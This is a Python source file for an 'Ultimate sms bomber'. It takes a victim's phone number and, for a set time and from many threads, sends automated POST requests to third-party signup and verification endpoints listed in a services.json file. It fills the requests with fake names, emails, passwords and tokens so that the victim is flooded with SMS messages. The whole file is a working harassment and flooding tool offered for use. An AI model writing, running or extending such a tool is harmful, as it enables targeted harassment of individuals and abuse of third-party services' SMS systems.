#!/usr/bin/env python3

# TODO: proxy

import json
import argparse
import requests
import threading
from itertools import cycle
from time import time, sleep
# my modules
import randomData


class Service:

    def __init__(self, service, timeout):
        self.service = service
        self.timeout = timeout

    def parse_data(self):
        """ Parse data from service, creates datatype and payload vars """
        if "data" in self.service:
            self.datatype = "data"
            self.payload = self.service["data"]
        elif "json" in self.service:
            self.datatype = "json"
            self.payload = self.service["json"]
        else:
            self.datatype = "url"
            self.payload = json.dumps({"url": self.service["url"]})

    def replace_data(self, phone):
        """ Replace datas in payload """
        for old, new in {
            "'": '"',
            "%phone%": phone,
            "%phone9%": phone[1::],
            "%name%": randomData.random_name(),
            "%email%": randomData.random_email(),
            "%password%": randomData.random_pass(),
            "%token%": randomData.random_token()
        }.items():
            if old in self.payload:
                self.payload = self.payload.replace(old, new)
        self.payload = json.loads(self.payload)

    def _send_request(self):
        """ Creating session and request, check payload, send request. """
        with requests.Session() as session:
            request = requests.Request("POST", self.service["url"])
            if self.datatype == "json":
                request.json = self.payload
            elif self.datatype == "data":
                request.data = self.payload
            else:
                request.url = self.payload["url"]
            request = request.prepare()
            session.send(request, timeout=self.timeout)


def getDomainName(service):
    """ Return domain name from service obj. """
    url = service.service["url"]
    return url.split('/')[2]


def cleanPhoneNumber(phone):
    """ Clean phone number from trash """
    for trash in ["'", '"', "-", "_", "(", ")"]:
        if trash in phone:
            phone = phone.replace(trash, "")
    if phone[0] == '+':
        phone = phone[1::]
    if phone[0] == '8':
        phone = '7' + phone[1::]
    if phone[0] == '9':
        phone = '7' + phone
    return phone


def startBomber(thread_name):
    # Shuffle services and start infinity cycle
    randomData.shuffleServices(services)
    for elem in cycle(services):
        if time() >= stop_time:
            print("killing thread %s" % thread_name)
            return
        sleep(interval)
        # Creating obj of service, parse data, replace data and send request:
        service = Service(elem, timeout)
        domain_name = getDomainName(service)
        service.parse_data()
        service.replace_data(phone)
        # Catching errors
        try:
            service._send_request()
            print('Success - ' + domain_name)
        except requests.exceptions.ReadTimeout:
            print("FAIL - " + domain_name + " - ReadTimeout")
        except requests.exceptions.ConnectTimeout:
            print('FAIL - ' + domain_name + " - ConnectTimeout")
        except requests.exceptions.ConnectionError:
            print('FAIL - ' + domain_name + " - ConnectionError")
        except Exception as err:
            print(err)
        except KeyboardInterrupt:
            threading._shutdown()
            return


# Creating parser obj
parser = argparse.ArgumentParser(
    description="Ultimate sms bomber", prog="sms_bomber",
    epilog="Usage example: ./bomber.py 79877771122 20")
# Position args
parser.add_argument("phone", help="target phone number, SHOULDN'T CONTAIN SPACES")
parser.add_argument("stop_time", type=float, help="bombing time in seconds")
# Optional args
parser.add_argument(
    "-t", "--threads", default=50, type=int, metavar="<int>",
    help="threads count, more threads = more sms, (default: %(default)s)")
parser.add_argument(
    "-i", "--interval", default=0.1, type=float, metavar="<seconds>",
    help="intervals between requests in sec, (default: %(default)s)")
parser.add_argument(
    "-T", "--timeout", default=3, type=float, metavar="<seconds>",
    help="timeout for request in sec, (default: %(default)s)")
parser.add_argument(
    "-v", "--version", action="version",
    version="%(prog)s 0.0.3 alpha")
args = parser.parse_args()


if __name__ == "__main__":
    # Args reductions for code quality and modifying
    phone = cleanPhoneNumber(args.phone)
    stop_time = time() + args.stop_time
    threads = args.threads
    interval = args.interval
    timeout = args.timeout

    # Phone num filter
    if len(phone) != 11 and len(phone) != 7:
        print("Invalid number length : %s" % phone)
        exit()

    with open("./services.json", "r") as file:
        global services
        services = json.load(file)["services"]

    print("Creating %s threads" % threads)

    # Creating threads
    for i in range(threads):
        print("Thread %s created" % (i + 1))
        threading.Thread(target=startBomber, args=(i + 1, )).start()
    # Killing all threads when bomber is
    threading._shutdown()
    print('all done!!!')
